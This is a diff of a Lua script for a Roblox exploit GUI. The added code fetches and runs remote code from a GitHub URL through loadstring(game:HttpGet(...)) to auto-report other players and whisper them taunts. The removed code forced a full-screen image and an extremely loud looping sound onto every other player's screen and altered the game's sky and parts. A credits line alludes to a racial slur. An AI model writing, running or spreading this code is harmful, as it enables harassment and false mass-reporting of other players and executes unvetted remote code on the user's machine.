@@ -33,7 +33,7 @@ Name.Parent = Frame
 Name.BackgroundColor3 = Color3.new(1, 1, 1)
 Name.Size = UDim2.new(0, 378, 0, 25)
 Name.Font = Enum.Font.GothamBold
-Name.Text = "b00sjklo Gui      UPDATE 2.4"
+Name.Text = "b00sjklo Gui   👑   UPDATE 2.4"
 Name.TextColor3 = Color3.fromRGB(0, 0, 0)
 Name.TextScaled = true
 Name.TextSize = 14.000
@@ -45,7 +45,7 @@ Credits.BackgroundColor3 = Color3.new(1, 1, 1)
 Credits.Position = UDim2.new(0, 0, 0.912, 0)
 Credits.Size = UDim2.new(0, 378, 0, 22)
 Credits.Font = Enum.Font.GothamBold
-Credits.Text = "Swearing | He Said The N Word"
+Credits.Text = "BOSSJKLO IS THE KING👑"
 Credits.TextColor3 = Color3.fromRGB(0, 0, 0)
 Credits.TextScaled = true
 Credits.TextSize = 14.000
@@ -248,7 +248,7 @@ e1x1x1x1Laugh.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
 e1x1x1x1Laugh.Position = UDim2.new(0.0714285746, 0, 0.648000002, 0)
 e1x1x1x1Laugh.Size = UDim2.new(0, 79, 0, 34)
 e1x1x1x1Laugh.Font = Enum.Font.GothamBold
-e1x1x1x1Laugh.Text = "Shedletskyify"
+e1x1x1x1Laugh.Text = "AUTO REPORT"
 e1x1x1x1Laugh.TextColor3 = Color3.fromRGB(0, 0, 0)
 e1x1x1x1Laugh.TextScaled = true
 e1x1x1x1Laugh.TextSize = 14.000
@@ -256,58 +256,15 @@ e1x1x1x1Laugh.TextWrapped = true
 e1x1x1x1Laugh.MouseButton1Down:connect(function()
 	--Made by Servano
 
- tex1 = "rbxassetid://292916914"
-tex2 = "rbxassetid://292916914"
-tex3 = "rbxassetid://292916914"
-tex4 = "rbxassetid://10035308982"
- 
-local w = workspace:GetDescendants()
- 
-for i= 1,#w do
-    if w[i]:isA("BasePart") then
-        pe = Instance.new("ParticleEmitter", w[i])
-        pe.Texture = tex4
-        pe.VelocitySpread = 5
-    end
-end
- 
-local playerLeaderstats = {}
- 
-for i, v in pairs(playerLeaderstats) do
-pe = Instance.new("ParticleEmitter",v.Character.HumanoidRootPart)
-pe.Texture = "http://www.roblox.com/asset/?id=10035308982"
-pe.VelocitySpread = 50
-end
+ getgenv().autoreportcfg = {
+    Webhook = "😡", -- you can leave it empty if u want ingame notifs 
+    autoMessage = { -- whispers to people if they get autoreported
+       enabled = true,
+       Message = 'so sad you got Hack',
+    },
+}
 
-b = Instance.new("Sky") 
-b.Parent = game.Lighting 
-b.SkyboxBk = "http://www.roblox.com/asset/?id=172423468" 
-b.SkyboxDn = "http://www.roblox.com/asset/?id=172423468" 
-b.SkyboxFt = "http://www.roblox.com/asset/?id=172423468" 
-b.SkyboxLf = "http://www.roblox.com/asset/?id=172423468" 
-b.SkyboxRt = "http://www.roblox.com/asset/?id=172423468" 
-b.SkyboxUp = "http://www.roblox.com/asset/?id=172423468"
-	for i,v in pairs(game.Players:GetPlayers()) do
-		if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
-			spawn(function()
-				local newgui = Instance.new("ScreenGui",v.PlayerGui)
-				newgui.Name = "Screamer"
-				local newimage = Instance.new("ImageLabel",newgui)
-				newimage.Image = "http://www.roblox.com/asset/?id=172423468"
-				newimage.Size = UDim2.new(1,1,1,1)
-				local s = Instance.new("Sound",newgui)
-				s.SoundId = "rbxassetid://"
-				s.Volume = 9999999999999999999999999999999999999
-				s.Looped = true
-				s:Play()
-				print("Screamed "..v.Name)
-				while wait(9) do
-
-					newimage.Parent:Destroy()
-
-				end
-			end)
-		end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/Auto-Report/main/main.lua"))()
 	end
 end)
 DayToNight.Name = "DayToNight"
